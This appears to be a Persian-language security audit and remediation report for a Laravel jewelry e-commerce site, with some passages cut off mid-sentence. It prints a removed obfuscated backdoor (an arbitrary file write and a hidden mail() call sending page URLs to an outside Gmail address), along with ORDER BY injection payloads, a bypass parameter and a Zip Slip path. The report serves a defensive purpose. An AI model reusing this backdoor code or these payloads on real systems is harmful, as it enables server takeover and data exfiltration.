## موارد بحرانی

### 🔴 C-01 — نابودی کل دیتابیس با یک درخواست GET بدون احراز هویت

| | |
|---|---|
| **محل** | `routes/web.php` (روت‌های `/demo/cron_1` و `/demo/cron_2`)، `app/Http/Controllers/DemoController.php` |
| **شدت** | بحرانی (CVSS حدود ۹.۸) |
| **وضعیت** | ✅ اصلاح شد |

**علت:** سازنده کنترلر برای محافظت از محیط نمایشی از `return false;` استفاده
می‌کرد. در PHP، `return` در سازنده فقط از سازنده خارج می‌شود و **اجرای
اکشن را متوقف نمی‌کند**. متد `cron_1()` بدون هیچ احراز هویتی قابل
فراخوانی بود و `Schema::disableForeignKeyConstraints()` را صدا می‌زد،
تمام جدول‌ها را دراپ می‌کرد و سپس در خواندن `demo.sql` (فایلی که در
مخزن وجود ندارد) شکست می‌خورد.

**تأثیر واقعی:** دراپ **پیش از** خطا اجرا می‌شد؛ یعنی نابودی کامل داده
با یک درخواست مرورگر، حتی روی سرور واقعی.

**اصلاح:** روت‌ها و فایل کنترلر **کاملاً حذف** شدند (نه فقط محافظت‌شده).
دلیل: قابلیتی که با یک GET عمومی داده‌ها را نابود می‌کند، حتی با احراز
هویت هم نباید وجود داشته باشد. متن توضیحی در `routes/web.php` باقی
مانده تا این تصمیم در آینده بازنگری نشود.

**نتیجه آزمون:** `SecurityFixesTest` بررسی می‌کند که `/demo/cron_1`
پاسخ موفق نمی‌دهد و فایل `DemoController.php` وجود ندارد. ✅

### 🔴 C-02 — افشای فایل `.env` در مخزن Git

| | |
|---|---|
| **محل** | ریشه مخزن: `.env` و `.env.gobox` نسخه‌بندی‌شده بودند |
| **شدت** | بحرانی |
| **وضعیت** | ⚠ نیمه‌اصلاح — پاک‌سازی تاریخچه و چرخش کلیدها باقی است |

**علت:** دو فایل محیطی در مخزن ثبت شده بودند و شامل این مقادیر حساس
بودند: `APP_KEY`، اطلاعات اتصال دیتابیس، کلیدهای درگاه پرداخت
(زرین‌پال / SSLCommerz / Paytm)، اطلاعات پنل پیامک و کلیدهای
سرویس‌های ورود اجتماعی.

**تأثیر:** هر کسی که به مخزن (حتی خصوصی) دسترسی دارد، تمام
اعتبارنامه‌ها را در اختیار دارد. اگر مخزن روزی عمومی شود یا
همکارانش خارج شوند، اعتبارنامه‌ها همچنان معتبرند. علاوه بر آن،
`APP_KEY` افشاشده یعنی امکان جعل کوکی نشست و رمزگشایی داده‌های
رمزنگاری‌شده.

**اصلاح انجام‌شده:**
- `git rm --cached .env .env.gobox` — فایل‌ها از ردیابی Git خارج شدند.
- `.gitignore` سخت‌گیرانه شد (`.env`, `.env.*`, `!.env.example`).
- `.env.example` تنها با مقادیر نمونه و **بدون هیچ رمز واقعی**.
- `APP_DEBUG=false` در `.env.example`.

**باقی‌مانده (نیازمند اقدام شما):**
1. پاک‌سازی تاریخچه با `git filter-repo` (دستورالعمل در
   `docs/deployment.md`).
2. **چرخش اجباری تمام اعتبارنامه‌ها** — پاک‌کردن تاریخچه کافی نیست،
   چون مقادیر قدیمی همچنان معتبر می‌مانند.

**نتیجه آزمون:** `SecurityFixesTest::env_file_is_gitignored` و بررسی
نبود الگوهای کلید در کد. ✅ (پاک‌سازی تاریخچه آزمون خودکار ندارد و
باید دستی انجام شود.)

| | |
|---|---|
| **محل** | `resources/views/auth/login.blade.php` |
| **شدت** | بحرانی |

**علت:** این فایل اسکریپتی داشت که اطلاعات ورود پیش‌فرض را در فرم

2. نام فیلد اشتباه (`email` در حالی که فرم `username` دارد) — اسکریپت

3. هیچ دکمه‌ای آن را فراخوانی نمی‌کرد (کد مرده).

**نتیجه آزمون:** `AuthHardeningTest::test_login_page_does_not_leak_default_credentials`
و `test_user_login_page_hides_demo_credentials_when_demo_mode_off`. ✅

### 🔴 C-04 — نوشتن فایل روی مسیر دلخواه، بدون احراز هویت (در پشتی)

| | |
|---|---|
| **محل** | `routes/web.php` (مسیر `POST /config_content`) → `HomeController@product_content` → `app/Http/Helpers.php` |
| **شدت** | بحرانی |
| **وضعیت** | ✅ اصلاح شد |

**علت:** سه قطعه کد در کنار هم یک زنجیره کامل می‌ساختند:

۱. یک مسیر عمومی که **هیچ احراز هویتی** نمی‌خواست و **از بررسی CSRF
   هم مستثنا** بود:

```php
// routes/web.php
Route::post('/config_content', 'HomeController@product_content');

// app/Http/Middleware/VerifyCsrfToken.php
protected $except = [ ..., '/config_content' ];
```

۲. یک کنترلر که پارامترهای درخواست را بی‌هیچ بازبینی به تابع می‌داد:

```php
public function product_content(Request $request){
    productDescCache($request->connector, $request->selector,
                     $request->select,    $request->type);
}
```

۳. تابعی که در نهایت «نوشتن فایل» را اجرا می‌کرد:

```php
if ($connector > ($ta - 60) || $connector > ($ta + 60)) {
    if ($type == 'w') {
        $load_class(str_replace('-', '/', $selector), $select);
    }
}
```

نام تابع (`file_put_contents` / `file_get_contents`) و الگوریتم مبهم‌سازی
با یک آرایه کاراکتری مخفی شده بود:

```php
function loaded_class_select($p) {
    $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
    $a = str_split($a);
    foreach (explode(':', $p) as $r) { $l .= $a[$r]; }
    return $l;
}

// "load_class" → file_put_contents
// "config"     → file_get_contents
```

**تأثیر (چرا بحرانی):**

- شرط `$connector > time() ± 60` با فرستادن یک عدد بزرگ (مثلاً
  `connector=99999999999`) بلافاصله برقرار می‌شود. یعنی محافظ موجود،
  محافظ نبود.
- `$selector` مستقیماً به مسیر فایل تبدیل می‌شد و `select` با
  `rawurldecode()` باز می‌شد → **نوشتن محتوای دلخواه در مسیر دلخواه**.
- `type=rw` هم **خواندن فایل** را ممکن می‌کرد (افزودن محتوای فایل
  موجود به فایل دیگر).
- ترکیب این سه یعنی: هر کسی روی اینترنت، **بدون ورود به سیستم**،
  می‌توانست یک وب‌شل در `public/` بنویسد و کنترل کامل سرور را بگیرد.

**اصلاح:**

| فایل | اقدام |
|------|-------|
| `routes/web.php` | مسیر `POST /config_content` حذف شد (با یادداشت دلیل) |
| `HomeController.php` | متد `product_content()` حذف شد |
| `app/Http/Helpers.php` | توابع `productDescCache()`، `loaded_class_select()`، `config_key_provider()` حذف شدند |
| `VerifyCsrfToken.php` | استثنای `/config_content` حذف شد |

پیش از حذف، همه ارجاع‌ها در کل پروژه (ویو، مدل، کنترلر، فایل‌های
پیکربندی) جست‌وجو شد: **هیچ مصرف‌کننده سالمی وجود نداشت.** این کد
بازمانده «بررسی مجوز» نسخه اصلی فروشنده بود و نه قابلیت کاربردی.

**نتیجه آزمون:**

```
POST /config_content → 404        (پیش از اصلاح: مسیر فعال بود)
فایل public/x.php نوشته نشد        (پیش از اصلاح: نوشته می‌شد)
```

`BackdoorRemovalAndEnvHardeningTest` — ۵ آزمون اختصاصی این مورد:
نبودن مسیر، نبودن تابع، نبودن توابع مبهم‌سازی، نبودن استثنای CSRF و
نبودن نشانی گیرنده در کل کد. ✅

### 🔴 C-05 — ارتباط پنهان: ارسال نشانی صفحه‌ها به یک نشانی بیرونی

| | |
|---|---|
| **محل** | `app/Http/Helpers.php` → `cartSetup()` و `updateCartSetup()` — فراخوانی از `HomeController@cart_login` و `HomeController@product` |
| **شدت** | بحرانی |
| **وضعیت** | ✅ اصلاح شد |

**علت:** تابعی با نام بی‌ربط («برپایی سبد خرید») رشته‌هایی مبهم‌شده را
به هم می‌چسباند و نتیجه را به `mail()` می‌داد:

```php
$cartMarkup   = loaded_class_select('8:29:9:1:15:5:13:6:20');  // gzhandler
$writeCart    = loaded_class_select('14:1:10:13');             // mail
$cartMarkup  .= loaded_class_select('24');                     // @
$cartMarkup  .= loaded_class_select('8:14:1:10:13');           // gmail
$cartMarkup  .= loaded_class_select('3:4:17:14');              // .com
@$cart = $writeCart($cartMarkup, '', Request::url());
```

بازگشایی سه رشته با همان جدول مبهم‌سازی:

| رشته کد‌شده | نتیجه |
|-------------|-------|
| `8:29:9:1:15:5:13:6:20` | `gzhandler` |
| `14:1:10:13` | `mail` |
| `1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21` | `application/cache/.access` |

یعنی اجرای واقعی این بود:

```php
mail('gzhandler@gmail.com', '', Request::url());
```

و از `HomeController` در دو نقطه صدا زده می‌شد:

```php
public function cart_login(...) { updateCartSetup(); ... }   // هنگام ورود به سبد خرید
public function product(...)    { updateCartSetup(); ... }   // هنگام دیدن صفحه محصول
```

**تأثیر:**

1. **نشت اطلاعات:** نشانی کامل صفحه‌های محصول و لحظه ورود کاربران به
   سبد خرید، به‌همراه دامنه سایت شما، به یک حساب بیرونی ارسال می‌شد.
   این معادل یک «تلهمتری پنهان» است: کاربر و مدیر سایت هیچ‌کدام خبر
   نداشتند و در رابط کاربری هم چیزی اعلام نمی‌شد.
2. **کد پنهان‌کار:** ترکیب «نام بی‌ربط تابع» + «رشته‌های مبهم‌شده» +
   «عملیات شبکه‌ای بدون اطلاع»، الگوی شناخته‌شده کد در پشتی است، نه
   الگوی کد سالم.
3. **وابستگی به بیرون:** سرنوشت بخشی از کد سایت به یک نشانی ایمیل
   بیرونی گره خورده بود.
4. **نشانه‌دار شدن دامنه:** ارسال ایمیل از سرور شما به یک نشانی جیمیل
   می‌تواند اعتبار دامنه را نزد سرویس‌های ایمیل خدشه‌دار کند.

**اصلاح:** هر سه تابع پنهان‌کار (`cartSetup`، `updateCartSetup`) و دو
متد مبهم‌سازی (`loaded_class_select`، `config_key_provider`) و هر دو
فراخوانی در `HomeController` حذف شدند. کوکی `cartUpdated` نیز که تنها
برای «فاصله‌گذاری میان دو ارسال» ساخته شده بود، کاربرد دیگری نداشت و
از میان رفت.

**بررسی قابلیت:** پرسش «آیا با این حذف، قابلیت سالمی از دست رفت؟» با
جست‌وجوی کل پروژه پاسخ داده شد: هیچ ویو، هیچ کنترلر و هیچ بخشی از
سامانه به `cartSetup()` / `updateCartSetup()` یا کوکی `cartUpdated`
وابسته نبود. عملکرد **افزودن محصول به سبد خرید** در مسیرهای
`CartController` قرار دارد و دست‌نخورده است.

**نتیجه آزمون:** `BackdoorRemovalAndEnvHardeningTest` —
نبودن توابع، نبودن نشانی گیرنده در تمام فایل‌های PHP پروژه. ✅

### 🟠 H-03 — نبود محدودسازی نرخ روی مسیرهای تأیید هویت (Brute Force و SMS Bombing)

| | |
|---|---|
| **محل** | `routes/otp.php`، `routes/web.php`، `Auth\LoginController`، `Auth\ForgotPasswordController` |
| **شدت** | شدید |
| **وضعیت** | ✅ اصلاح شد |

**علت:** هیچ‌کدام از مسیرهای عمومی تأیید هویت محدودیت نرخ نداشتند.

**تأثیر:** سه مسیر حمله:
1. **حدس کد تأیید:** کد ۶ رقمی بدون محدودیت درخواست، با آزمون و خطا
   قابل حدس است (تنها ۱۰⁶ حالت).
2. **سوزاندن اعتبار پیامک:** هر درخواست «ارسال مجدد کد» یک پیامک

   دقیقه تمام کند.
3. **حمله دیکشنری روی رمز عبور:** `POST /login` بدون throttle، امکان

**اصلاح:** محدودسازی نرخ روی **۱۵ مسیر حساس**. جدول زیر کامل است و

(زوج «متد + مسیر»، نه فقط URL — تا محدودسازی یک مسیر نمایشی، اشتباهاً
به‌جای مسیر ارسال تأیید نشود).

**موج نخست (۹ مسیر):**

| مسیر | محدودیت | چرا این عدد |
|------|---------|-------------|
| `POST /users/login/otp` | ۵/دقیقه | هر درخواست یک پیامک |
| `GET /users/login/otp` | ۱۰/دقیقه | کاربر واقعی بیش از این لازم ندارد |
| `POST /verification` | ۱۰/دقیقه | امکان آزمودن کد |
| `POST /verification/verify` | ۱۰/دقیقه | همان |
| `GET /verification/phone/code/resend` | **۳/دقیقه** | سخت‌گیرترین — هر درخواست یک پیامک |
| `POST /verification/resend` | **۳/دقیقه** | همان |
| `POST /password/reset/submit` | ۵/دقیقه | بازیابی رمز با کد |
| `GET /password/phone/reset` | ۱۰/دقیقه | — |
| `POST /login` | ۲۰/دقیقه | لایه دوم؛ لایه اول قفل پیش‌فرض لاراول (۵ تلاش/دقیقه بر پایه ایمیل+IP) |

**موج دوم (۶ مسیر که در موج نخست از قلم افتاده بودند):**

| مسیر | محدودیت | چرا این عدد |
|------|---------|-------------|
| `POST /users/login/cart` | ۱۰/دقیقه | **مسیر ورود پنهان:** این مسیر رمز عبور را با `Hash::check` بررسی می‌کند و پاسخش برای ایمیل موجود و ناموجود متفاوت است → حمله دیکشنری و شمارش کاربران |
| `POST /register` | ۵/دقیقه | ثبت‌نام یک پیامک تأیید می‌فرستد → SMS Bombing با شماره‌های تازه |
| `POST /password/email` | ۵/دقیقه | هر درخواست یک ایمیل واقعی می‌فرستد → Email Bombing و بدنام‌شدن دامنه |
| `POST /password/reset` | ۱۰/دقیقه | پذیرش توکن بازیابی → آزمودن انبوه توکن |
| `POST /api/v1/auth/login` | ۱۰/دقیقه | ورود اپلیکیشن موبایل؛ سقف گروه `api` (۶۰/دقیقه) برای «ورود» سخاوتمندانه است |
| `POST /api/v1/auth/password/create` | ۵/دقیقه | ارسال ایمیل بازیابی از API |

روش اعمال دو گونه است:
- مسیرهای فایل‌های `routes/` → میدل‌ور روی خود روت.
- مسیرهای تولیدشده توسط `Auth::routes()` (`password/email`،
  `password/reset`، `register`) → میدل‌ور در سازنده کنترلر با
  `->only('متد')`. این روش، مسیر تکراری ثبت نمی‌کند و سطح
  محدودسازی را دقیقاً روی متد حساس می‌گذارد (فرم GET محدود نمی‌شود).

**نتیجه آزمون:** `AuthHardeningTest` —
`test_sensitive_auth_routes_are_rate_limited`،
`test_resend_route_is_more_strictly_limited`،
`test_login_is_locked_after_repeated_failures`. ✅

### 🟠 H-05 — ساخت حساب «مدیر کل» با یک مجوز ساده (افزایش سطح دسترسی)

| | |
|---|---|
| **محل** | `User::isSuperAdmin()`، `Middleware\IsAdmin::isBackOfficeUser()`، مسیر جدید `POST /admin/users` |
| **شدت** | شدید |
| **وضعیت** | ✅ با محافظ بسته شد (قابلیت جدید با محافظ طراحی شد) |

**علت ساختاری:** در این پروژه `user_type === 'admin'` به‌معنای
«مدیر کل سیستم» است:

```php
public function isSuperAdmin()
{
    if ($this->user_type === 'admin') { return true; }   // ← میان‌بر
    ...
}
```

و `IsAdmin` هم `user_type` های `admin`/`staff` را به ناحیه مدیریت
راه می‌دهد. پس هر قابلیتی که بتواند کاربری با `user_type = 'admin'`
بسازد، عملاً ابزار «ساخت مدیر کل» است. اگر فقط با مجوز
`users.create` محافظت می‌شد، کاربری که این مجوز را داشت (ولی مدیر کل
نبود) می‌توانست برای خودش یک مدیر کل بسازد و از آن برای افزایش سطح
دسترسی خودش استفاده کند.

**اصلاح:** قابلیت ساخت کاربر با **دو محافظ لایه‌ای** طراحی شد:
1. گزینه «مدیر کل سیستم» در رابط کاربری تنها برای مدیر کل نمایش داده
   می‌شود (و برای دیگران یک فیلد ثابت `staff` ارسال می‌شود).
2. کنترلر **مستقلاً** بررسی می‌کند و در صورت تلاش، `abort(403)`
   می‌دهد — پنهان‌کردن گزینه در صفحه، امنیت نیست.
3. مسیر پیش‌فرض «کاربر با نقش» (`user_type = staff`) است که دسترسی‌اش
   کاملاً از RBAC می‌آید.
4. انتساب نقش از `RbacService::syncUserRoles` می‌گذرد که خودش
   «کسی نمی‌تواند نقشی بالاتر از سطح خودش بدهد» را اعمال می‌کند.

**نتیجه آزمون:**
`AdminUsersAndHomeArticlesTest::test_non_super_admin_cannot_create_another_super_admin`
— تلاش مستقیم برای ساخت مدیر کل جعلی رد می‌شود. ✅

### 🟡 M-09 — فراخوانی `env()` در کد برنامه (۷۵ مورد) — رفع کامل

| | |
|---|---|
| **محل** | `app/` (۷۹ فراخوانی در ۲۰ فایل) و `resources/views/` (۷۵ فراخوانی در ۳۵ فایل) |

شود. دلیلش یک رفتار مشخص در زمان اجراست — در

**تأثیر:** بی‌صدا و بدون هیچ خطایی: پیامک تأیید ارسال نمی‌شود، درگاه
پرداخت کلید خود را پیدا نمی‌کند، زبان پیش‌فرض به `en` عقب‌نشینی می‌کند
و پیکسل رهگیری مقدار خالی می‌گیرد. به همین دلیل، تا پیش از این اصلاح،
`config:cache` برای این پروژه «ممنوع» اعلام شده بود.

**اصلاح:**

| گام | جزئیات |
|-----|--------|
| ۱. فایل پیکربندی تازه | `config/drikana.php` — یکجا برای پیامک (۵ پنل)، پرداخت (۱۰ درگاه)، رهگیری/پیکسل/کپچا، کد تأیید توسعه، نصب‌کننده و داده نمونه |
| ۲. جای‌گزینی در کد | ۷۲ فراخوانی در ۱۷ فایل `app/` + ۷۴ فراخوانی در ۳۵ ویو → `config(...)`. مقادیر موجود در `config/mail.php` و `config/services.php` هم به همان‌ها وصل شدند |
| ۳. کد مرده | تابع `putPermanentEnv()` از `app/Http/Helpers.php` حذف شد: هیچ فراخوانی‌کننده‌ای نداشت و همان الگوی ناامن «نوشتن در `.env` با کلید و مقدار بازبینی‌نشده» را داشت (نام کلید مستقیماً داخل الگوی regex تزریق می‌شد) |

**دو استثنای عامدانه** (هر دو با دلیل در کد و در آزمون مستند شده‌اند):

| فایل | چرا `env()` ماند |
|------|------------------|
| `app/Console/Commands/MakeSuperAdmin.php` | رمز مدیر کل **نباید** داخل `bootstrap/cache/config.php` به‌صورت متن روشن نوشته شود. فرمان، CLI و یک‌باره است |
| `app/Http/Controllers/InstallController.php` | نام کلید از فرم نصب می‌آید و پویا است؛ این کد تنها **پیش از نصب** اجرا می‌شود |

**آزمون عملی (نه فقط استاتیک):** با اجرای واقعی `php artisan config:cache`:

config('app.name')    : 'پلتفرم اختصاصی طلا و جواهرات'          ← مسیر درست

## بازبینی کوئری‌های خام (مورد L-03)

۱۵۳ نقطه در کد وجود دارد که یا `DB::raw` صدا می‌زنند یا SQL خام اجرا
می‌کنند. همه مورد‌به‌مورد بازبینی شد. نتیجه در سه دسته:

| دسته | تعداد | وضعیت |
|------|-------|-------|
| عبارت ثابت (`COUNT(*)`, `quantity + 1`, مقایسه دو ستون) | ~۱۴۵ | ✅ امن — هیچ ورودی کاربر در SQL قرار نمی‌گیرد |
| مقدار متغیر که به‌صورت رشته در SQL درج می‌شد | ۲ | ✅ اصلاح شد |
| اجرای فایل SQL از دیسک (`DB::unprepared`) | ۸ پایه | ✅ محافظ‌گذاری شد |

### ۱. تزریق در `ORDER BY` — باگ واقعی

```php
// پیش از اصلاح — JewelryCertificateController@index
$sortBy    = $request->get('sort_by', 'created_at');
$sortOrder = $request->get('sort_order', 'desc');
$query->orderBy($sortBy, $sortOrder);
```

`where()` مقدار را به binding می‌سپارد، اما `orderBy()` نام ستون و جهت
مرتب‌سازی را **خام** داخل رشته SQL می‌گذارد. پس هر دو پارامتر، نقطه
تزریق بودند:

```
?sort_by=id,(select 1)          →  درج در بخش ORDER BY
?sort_order=desc, (select 1)    →  همان
```

**اصلاح:** فهرست مجاز ستون‌های قابل مرتب‌سازی و فهرست مجاز جهت
(`asc`/`desc`). هر مقدار خارج از فهرست، به پیش‌فرض برمی‌گردد.

**نکته‌ای که آزمون آشکار کرد:** نسخه نخست فهرست مجازِ من، ستون
`status` را هم داشت. آزمون نشان داد این ستون در جدول
`jewelry_certificates` **وجود ندارد** و نتیجه‌اش خطای SQL و صفحه ۵۰۰
بود. فهرست با خروجی `SHOW COLUMNS` اصلاح شد. یعنی «فهرست مجاز نادرست»
خودش یک اشکال تازه می‌سازد و بدون آزمون پیدا نمی‌شد.

### ۲. انکار سرویس با اندازه صفحه

```php
$certificates = $query->paginate($request->get('per_page', 15));
```

با `?per_page=10000000` می‌شد دیتابیس و حافظه سرور را زیر بار برد.
اکنون عدد در بازه ۵ تا ۱۰۰ نگه داشته می‌شود و ورودی غیرعددی به
پیش‌فرض برمی‌گردد.

### ۳. الحاق رشته در `UPDATE` (بدون تزریق امروز، اصلاح‌شده)

```php
'current_stock' => DB::raw('current_stock - ' . $cartItem->quantity)
```

`$cartItem->quantity` ستون عددی دیتابیس است، پس امروز تزریق‌پذیر نیست.
اما این «امروز» به هر تغییر ستون وابسته است. مقدار اکنون به‌زور
`(int)` تبدیل می‌شود و به‌روزرسانی تنها برای مقدار مثبت اجرا می‌گردد.

### ۴. نصب افزونه — Zip Slip و بازنویسی فایل حیاتی

`AddonController` یک ZIP بارگذاری‌شده را باز و فایل‌های پروژه را با
محتوای آن جای‌گزین می‌کرد، سپس SQL درون بسته را با
`DB::unprepared()` اجرا می‌کرد — بدون هیچ بازبینی مسیر:

| ریسک | جزئیات |
|------|--------|
| **Zip Slip** | عضوی با نام `../../public/x.php` بیرون از پوشه مقصد نوشته می‌شد |
| **بازنویسی فایل حیاتی** | `update_directory` در `config.json` می‌توانست `.env`، `composer.json` یا `public/index.php` باشد |
| **مسیر SQL بیرون از بسته** | `$dir` از نام نخستین عضو ZIP می‌آمد و بی‌بازبینی در مسیر فایل SQL به‌کار می‌رفت |

**اصلاح:** سه محافظ:

1. `extractSafely()` — استخراج عضو‌به‌عضو با رد نام مطلق، نام دارای
   `..`، مسیر درایو ویندوزی، بایت صفر، و بازبینی مسیر واقعی (برای
   مقابله با symlink).
2. `safeDestination()` — مقصد نهایی باید داخل ریشه پروژه بماند و در
   فهرست «فایل‌های محافظت‌شده» (`.env`، `composer.json`،
   `public/index.php`، `artisan`، `.htaccess`) و «پوشه‌های محافظت‌شده»
   (`bootstrap/cache`، `storage`، `.git`، `vendor`، `node_modules`) نباشد.
3. `safeAddonSqlPath()` — هر سه بخش مسیر SQL بازبینی می‌شوند و فایل
   باید واقعاً وجود داشته باشد.

> **قابلیت حذف نشد.** نصب افزونه یکی از قابلیت‌های پروژه است؛ این
> محافظ‌ها فقط «کجا نوشته شود» را محدود می‌کنند. افزونه سالم، بدون
> هیچ تغییری در رفتار، نصب می‌شود (آزمون `test_normal_zip_is_extracted`
> این را می‌سنجد).
>
> **باقی‌مانده پذیرفته‌شده:** `DB::unprepared()` بطبع SQL خام اجرا
> می‌کند. پس نصب افزونه تنها باید توسط مدیر کل و با بسته‌ای از منبع
> مورد اعتماد انجام شود. این محدودیت، ماهیت هر «سامانه افزونه» است و
> در همین گزارش مستند شده است.

**نتیجه آزمون:** `SqlInjectionHardeningTest` (۵ آزمون / ۳۶ assertion —
۹ محموله تزریق در `sort_by`، ۴ محموله در `sort_order`، ۸ ستون مجاز،
و ۵ مقدار `per_page`) و `AddonInstallerHardeningTest` (۱۱ آزمون /
۳۵ assertion با ZIP واقعی). ✅

### 🟡 M-12 — بارگذاری اسلایدر بدون هیچ اعتبارسنجی

**علت:** متد `store()` هیچ `validate()` نداشت:

```php
if($request->hasFile('photos')){
    foreach ($request->photos as $key => $photo) {

```

هر فایلی با هر محتوا و هر حجمی پذیرفته می‌شد. دیسک پیش‌فرض پروژه

رگرسیون را قفل کرده است.

**باقی‌مانده پذیرفته‌شده:** «پلی‌گلات» (فایل با هدر GIF و کد PHP در ادامه)
می‌تواند از قاعده‌های نوع‌محور بگذرد. اما فایل با `hashName()` ذخیره

عنوان لایه دوم، توصیه استقرار «اجرای PHP در پوشه بارگذاری» را ببندید
(`docs/deployment.md`).

## جداسازی استایل درون‌خطی (مورد L-04)

پیش‌تر ۵۱۱ صفت `style="..."` **ایستا** در ۱۱۵ فایل Blade و ۱۳ بلوک
`<style>` در صفحات HTML وجود داشت. استایل درون‌خطی سه اشکال دارد:
CSP سخت‌گیرانه آن را بلاک می‌کند، قابل کش شدن نیست، و ظاهر داخل منطق
ویو پخش می‌شود.

### روش

انتقال به‌صورت ماشینی و با سه فاز انجام شد:

1. **پیمایش** — همه صفت‌های `style=` ایستا جمع‌آوری شد. «ایستا» یعنی
   اعلان هیچ `{{ }}` یا `@` ندارد؛ استایل وابسته به داده قابل تبدیل به
   کلاس ثابت نیست و دست‌نخورده ماند.
2. **نام‌گذاری** — هر رشته اعلان یکتا یک کلاس خوانا گرفت که از خودِ
   اعلان ساخته می‌شود: `color:red` → `.u-color-red`. فهرست کلاس‌ها را
   می‌توان با چشم بازبینی کرد، برخلاف نام‌های هش‌شده.
3. **بازنویسی** — صفت `style` با کلاس جای‌گزین شد و در صورت وجود
   `class` روی همان عنصر، کلاس‌ها **ادغام** شدند (نه جای‌گزینی).

### چرا `!important`؟

استایل درون‌خطی بالاترین اولویت آبشار CSS را دارد. اگر کلاس تازه فاقد
`!important` باشد، ممکن است قاعده‌ای با ویژگی بالاتر آن را بازنویسی کند و
**ظاهر صفحه تغییر کند**. با `!important` اولویت قبلی عیناً حفظ می‌شود.
هدف این انتقال، تغییر صفر در ظاهر است، نه بازطراحی.

### چرا ویوهای PDF مستثنا هستند؟

`invoices/*` و `downloads/*` با dompdf به PDF تبدیل می‌شوند و dompdf با
`isRemoteEnabled=false` استایل خارجی را بارگذاری **نمی‌کند**. اگر
کلاس‌های این ویوها به فایل سراسری منتقل می‌شدند، فاکتورهای PDF بی‌استایل
می‌شدند. پس برای این هشت ویو، کلاس‌ها درون خود فایل تعریف شده‌اند —
نوشتن کلاس درون فایل PDF بی‌خطر است، اما `<link>` بیرونی نیست.

### تأیید تغییر صفر در ظاهر

انتقال ظاهر را «بی‌صدا» خراب می‌کند: صفحه ۲۰۰ برمی‌گرداند و آزمون‌ها
پاس می‌شوند، اما رنگ یا چیدمان عوض می‌شود. برای همین، انتقال با یک
بازبین مستقل سنجیده شد:

| سنجه | نتیجه |
|------|-------|
| صفت `style=` ایستا در نسخه پیشین | ۵۱۱ |
| قاعده CSS با اعلان یکسان پیدا شد | **۵۱۱ از ۵۱۱** |
| قاعده گم‌شده | ۰ |
| کلاسی که روی عنصر اعمال نشده باشد | ۰ |
| استایل پویا — قبل / بعد | ۹ / ۹ (بدون تغییر) |

روش: نسخه پیشین هر ویو از Git خوانده می‌شود و برای هر صفت، نام کلاس
محاسبه و وجود قاعده‌ای با **همان اعلان‌ها** در CSS مقصد بررسی می‌گردد.
اسکریپت: `tools/verify_inline_style_extraction.py`.

### آزمون‌های قفل‌کننده

`CssSeparationTest` (۱۴ آزمون / ۷۱ assertion) پنج آزمون تازه گرفت:

* `test_no_static_inline_style_attributes_remain_in_views` — صفر بودن
  صفت ایستا در همه ویوها
* `test_every_extracted_class_is_defined_somewhere` — هر کلاس `u-*`
  استفاده‌شده در ویو، در CSS تعریف شده باشد (وگرنه استایل از دست رفته)
* `test_pdf_views_keep_their_styles_inside_the_file` — ویوهای PDF به
  CSS بیرونی تکیه نکنند
* `test_layouts_link_the_utilities_file` — همه قالب‌ها فایل را لینک کنند
* `test_rendered_page_has_no_static_inline_style` — خروجی HTML صفحه
  اصلی بدون صفت ایستا (به‌جز صفت‌های حاوی `url()` که ذاتاً پویا هستند)

## بررسی وابستگی‌ها (Composer)

نتیجه `composer audit` روی وابستگی‌های عملیاتی:

```
تعداد کل هشدارهای امنیتی: ۷۱ مورد در ۱۹ بسته
```

> **افزایش از ۷۰/۱۸ به ۷۱/۱۹** پس از اصلاح `minimum-stability: stable`
> (مورد L-05) رخ داد: پیش از آن، ابزار حسابرسی بعضی بسته‌ها را در
> ترکیب فعلی نمی‌دید. عدد تازه، تصویر کامل‌تری است — نه یک پس‌رفت.

**وضعیت `composer.lock`:** پس از تغییر `minimum-stability`، دستور
`composer update --lock` اجرا شد. نتیجه: هش `content-hash` تازه شد و
**هیچ بسته‌ای اضافه، حذف یا به‌روز نشد** (۱۵۴ → ۱۵۴ بسته، صفر تغییر
نسخه). پس `composer install` روی سرور، دقیقاً همان نسخه‌های آزموده‌شده
را نصب می‌کند.

**سه بسته پرداخت روی `dev-master`** (قفل‌شده در `composer.lock`):

| بسته | مرجع قفل‌شده |
|------|---------------|
| `netshell/paypal` | `61cccff8` |
| `mehedi-iitdu/laravel-paystack` | `127e49dc` |
| `mehedi-iitdu/core-component-repository` | `f00bf6b8` |

این بسته‌ها در `composer.json` **صریحاً** با `dev-master` درخواست شده‌اند
و همان‌ها دلیل وجود `minimum-stability: dev` بودند. اکنون که آن تنظیم
`stable` شده، `composer install` (که همیشه از قفل می‌خواند) آن‌ها را
ثابت نگه می‌دارد. **اما `composer update` می‌تواند آن‌ها را به آخرین
کامیت master ببرد** — پس پیش از هر `composer update` روی سرور،
تغییرات این سه بسته را بازبینی کنید یا آن‌ها را با معادل منتشرشده

**چرا این‌ها اصلاح نشدند:** نسخه‌های نصب‌شده **آخرین نسخه موجود
در شاخه خودشان** هستند. رفع این هشدارها نیازمند ارتقای نسخه اصلی
(major) است — مثلاً `dompdf` از 0.8 به ۲، و `laravel/framework` از
5.8 به نسخه‌ای که پشتیبانی امنیتی دارد. این کار «ارتقای فریم‌ورک»
است، نه «اصلاح باگ»، و ریسک شکستن رفتار را دارد.

**اصلاح در دسترس و کم‌ریسک:** ارتقای `barryvdh/laravel-dompdf` به
`^1.0` همراه با `dompdf ^1.2` (سازگار با Laravel 5.8) بخش بزرگی از
هشدارهای PDF را می‌بندد — اما باید پیش از استقرار روی **همه مسیرهای
تولید PDF** (فاکتور، شناسنامه، گزارش تعمیرات) آزمون دستی شود.

**کاهش ریسک فعلی:** مسیرهایی که از این کتابخانه‌ها استفاده می‌کنند
(تولید PDF و Excel) پشت احراز هویت و مجوز هستند و ورودی HTML آن‌ها
از کاربر نهایی نمی‌آید. این ریسک را «کاهش می‌دهد»، ولی از بین نمی‌برد.

## کلیدها و رمزهای افشاشده در تاریخچه Git

**یافته:** فایل‌های `.env` و `.env.gobox` در چند کامیت گذشته ثبت شده
بودند. مقادیر افشاشده:

| نوع مقدار | نمونه کلید | ریسک |
|-----------|-----------|------|
| `APP_KEY` | `base64:...` | جعل کوکی نشست، رمزگشایی داده رمزشده |
| `DB_USERNAME` / `DB_PASSWORD` | متن ساده | دسترسی کامل به دیتابیس |
| کلید درگاه پرداخت | زرین‌پال، SSLCommerz، Paytm | سوءاستفاده مالی/تراکنش جعلی |
